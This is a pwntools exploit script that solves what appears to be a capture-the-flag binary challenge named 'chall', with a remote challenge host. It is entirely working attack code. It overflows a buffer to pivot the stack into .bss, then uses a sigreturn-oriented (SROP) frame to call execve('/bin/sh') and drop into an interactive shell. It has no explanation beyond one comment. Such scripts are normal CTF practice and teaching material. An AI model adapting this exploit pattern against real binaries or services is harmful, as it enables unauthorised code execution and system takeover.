from re import I
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("chall.v1t.site", 30211)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


bss = 0x0404020
syscall = 0x004011F1
leave_ret = 0x40122D
read_again = 0x401203
pop_rax = 0x4011ef
# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

# 栈迁移
payload = b"a" * 0x80 + p64(bss + 0x100)
payload += p64(read_again)
io.sendlineafter("pond.\n", payload)

payload = b"a" * 0x80 + p64(bss + 0x200)
payload += p64(read_again)
ddebug("break *0x040122D\n continue")
io.sendlineafter("pond.\n", payload)

# srop
frame = SigreturnFrame()
frame.rdi = 0x4041a0 # /bin/sh
frame.rsi = 0
frame.rdx = 0
frame.rax = constants.SYS_execve
frame.rip = syscall

payload = b"/bin/sh\x00"
payload = payload.ljust(0x80, b"\x00")
payload += p64(0)
payload += p64(pop_rax) + p64(0xf)
payload += p64(syscall)
payload += bytes(frame)
io.sendlineafter("pond.\n", payload)

io.interactive()
